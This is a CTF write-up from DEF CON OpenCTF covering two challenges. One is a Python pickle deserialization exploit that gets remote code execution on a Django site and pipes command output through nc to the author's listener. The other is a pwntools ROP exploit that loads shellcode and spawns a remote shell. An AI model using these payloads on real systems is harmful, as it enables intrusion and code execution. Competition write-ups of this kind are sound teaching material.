# OpenCTF

This year Shell Collecting Club showed up late, but strong to the DEF CON OpenCTF. We are under a time crunch for getting in these writeups. They will be revised a bit better later on. So we apologize for the brevity and lack of screen shots for the time being :)


## Solenya

### Web 300

When navigating to the supplied URL for the challenge, we were greeted with a really basic page that just had a JPG of Pickle Rick from Rick and Morty. There weren't any links that I can recall, so I tried to begin enumerating the server by hand to see if I could derive more information about the service.

I tried to go to *domain*/index.html to see what that would yield.

When doing so, I was greeted with a Django error page (Debug was set to True in the `setting.py` file!) that notified me that I had tried to navigate to a route that wasn't defined in `urls.py`. This error page also lets you know what the defined routes are.

There were 2 routes in particular that were interesting. The first was `/fingerprint/` and the second was `/wubbalubbadubdub/`.

In `/fingerprint/`, we were delivered a different Ricky and Morty image.

However, in `/wubbalubbadubdub/`, we were presented with a standard Django login page.

After trying for a bit to figure out what the creds might be, this attempt was abandoned and I started looking more at the web requests happening in the background.

I noticed a call to `/fingerprint/` with a large amount of POST data. This POST data was the output of javascript fingerprinting script that was being ran through `pickle.dumps` prior to being sent over, along with a `Token` HTTP header with the value `SSdtIFBpY2tsZSBSaWNrIQ==` (b64decode -> "I'm Pickle Rick!"). 

There were a bunch of references to Pickle Rick in this website, and python pickling is known to be dangerous. Therefore, it made sense that we could try to use this for our attack.

We assumed that the pickled POST data (literally called `pickle_data`), was unpickled on the `/fingerprint/` view.

So now, it was time to see if that worked.

I started a nc listener on my laptop (`nc -l -p 42069`) and sent some pickled data that would call `os.system` with some data piped into `nc`.

Due to the rush we were under, I didn't script up the entire payload delivery, but instead set a breakpoint in the JS debugger in the brower before the POST request was sent, and then modified the `pickle_data` variable to contain my generated payload.

Here was the test:

```import requests
import cPickle
import subprocess
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('{} | nc {} {}'.format('ls', '172.31.127.66', '42069'),),)

print cPickle.dumps(Exploit())
```

When I sent this data, I received the output of `ls` in my `nc` listener! We had RCE!

Now I just massaged the payload a bit, finding the flag in a file on the server.

You can read more about the badness of Python pickle [here](https://blog.nelhage.com/2011/03/exploiting-pickle/)


## babys_first_rop

# pwn

This was a pretty simple ROP challenge. 

From main, the binary calls a function that loads a bunch of data into a place labeled `gadgets` then calls a function called `vuln`.

This `vuln` function does a `read()` of 0x100 bytes into a buffer of size `0x50` creating an obvious overflow.

The stack was not executable.

The binary natively gave us a `pop rdi` gadget and a `pop rsi, r15` gadget.

Our method was to call `read()` again on the section of memory called `gadgets` (since it was executable), and load some shellcode there, finally returning to it.

The only thing we needed was a `pop rdx` gadget, which we were able to find using this:

```gdb-peda$ ropsearch "pop rdx" 
Searching for ROP gadget: 'pop rdx' in: binary ranges
0x0060118f : (b'5ac3')    pop rdx; ret
```

our final exploit is below:

```from pwn import *

#p = process(['./babys_first_rop'])
p = remote('172.31.2.62', 47802)
context.arch = 'amd64'

def pad_payload(payload, size):
    n = size - len(payload)
    payload += 'A' * n
    return payload

if __name__ == '__main__':
    ADDR_READ = 0x4004d0
    SHELLCODE = asm(shellcraft.amd64.linux.sh())
    print len(SHELLCODE)
    payload = 'A' * 0x50
    payload += 'whocares'
    payload += p64(0x400793) # pop rdi
    payload += p64(0)
    payload += p64(0x400791) # pop rsi, pop r15
    payload += p64(0x601080) # buf
    payload += 'AAAAAAAA'    # who cares
    payload += p64(0x60118f) # pop rdx
    payload += p64(0x64)     # shellcode len
    payload += p64(ADDR_READ)
    payload += p64(0x601080)
    p.sendline(pad_payload(payload, 0xff))
    p.sendline(SHELLCODE)
    p.interactive()
```

